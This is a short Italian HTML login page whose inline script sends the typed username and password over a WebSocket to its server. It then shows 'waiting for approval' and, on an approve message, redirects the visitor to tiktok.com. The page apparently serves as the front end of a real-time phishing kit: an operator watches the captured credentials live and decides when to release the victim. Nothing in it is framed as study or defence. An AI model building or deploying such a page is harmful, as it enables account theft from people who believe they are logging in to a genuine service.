<!doctype html>
<html lang="it">
<head>
  <meta charset="utf-8">
  <title>Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div id="box">
    <h2>Accesso</h2>
    <input id="user" placeholder="Username">
    <input id="pass" placeholder="Password" type="password">
    <button id="enter">INVIA</button>
    <div id="status" style="margin-top:15px; min-height:20px;"></div>
  </div>

  <script>
    const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host);

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      
      if (data.type === 'approve') {
        document.getElementById("status").innerHTML = 
          `<span style="color:green">✅ Accesso approvato! Reindirizzamento...</span>`;
        setTimeout(() => window.location.href = "https://www.tiktok.com", 800);
      } 
      else if (data.type === 'reject') {
        document.getElementById("status").innerHTML = 
          `<span style="color:red">${data.message || "Accesso negato. Riprova."}</span>`;
        document.getElementById("enter").disabled = false;
      }
    };

    document.getElementById("enter").onclick = () => {
      const user = document.getElementById("user").value.trim();
      const pass = document.getElementById("pass").value.trim();

      if (!pass) return alert("Inserisci la password");

      document.getElementById("status").innerHTML = `<span style="color:#888">⏳ In attesa di approvazione...</span>`;
      document.getElementById("enter").disabled = true;

      ws.send(JSON.stringify({ type: 'submit', user: user, message: pass }));
    };
  </script>
</body>
</html>
